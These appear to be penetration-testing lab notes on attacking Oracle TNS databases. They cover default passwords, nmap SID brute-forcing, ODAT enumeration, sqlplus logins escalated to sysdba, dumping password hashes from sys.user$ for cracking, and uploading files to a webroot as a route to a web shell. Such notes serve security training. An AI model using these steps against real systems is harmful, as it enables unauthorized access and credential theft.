> Oracle Transparent Network Substrate

- Communication protocol that facilitates the communication between oracle databases and applications over networks.
- Default Listener port : `TCP/1521`
- Oracle 9 has a default password, `CHANGE_ON_INSTALL`
- Oracle DBSNMP service also uses a default password, `dbsnmp`
- Oracle Database Attacking Tool (`ODAT`) is an open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases.

## Nmap

```bash
sudo nmap -p1521 -sV 10.129.204.235 --open
```

- In Oracle RDBMS, a System Identifier (`SID`) is a unique name that identifies a particular database instance
- It can have multiple instances, each with its own System ID. An instance is a set of processes and memory structures that interact to manage the database's data.
## Nmap - SID Bruteforcing

```bash
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```

## ODAT

- We can use odat.py to perform a variety of scans to enumerate and gather information about the Oracle database services and it's components.

```bash
#using the all option to use all modules of the odat tool.
./odat.py all -s 10.129.204.235
```

- If we get valid credentials using these methods, we can use `sqlplus` to connect to the Oracle database and interact with it.

## SQLplus - Login

``` bash
sqlplus scott/tiger@10.129.204.235/XE
```

[SQLplus commands](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985)

## Oracle RDBMS - Database Enumeration

```bash
#Trying to use scott's acccount to log in as the system database admin to have higher privileges.

sqlplus scott/tiger@10.129.204.235/XE as sysdba
```

**Retrieve password hashes from `sys.user$` and try to crack them offline.**

## Oracle RDBMS - Extract Password Hashes

```bash
select name, password from sys.user$;
```


**Another option is to upload a web shell to the target.** However, this `requires the server to run a web server`, and `we need to know the exact location of the root directory `for the webserver. Nevertheless, if we know what type of system we are dealing with, we can try the default paths, which are:

|**OS**|**Path**|
|---|---|
|Linux|`/var/www/html`|
|Windows|`C:\inetpub\wwwroot`|

## Oracle RDBMS - File Upload

```bash
HrithikManoj000@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
HrithikManoj000@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

Finally, we can `test if the file upload approach worked `with `curl`. Therefore, we will use a `GET http://<IP>` request, or we can visit via browser.

```bash
curl -X GET http://10.129.204.235/testing.txt
```
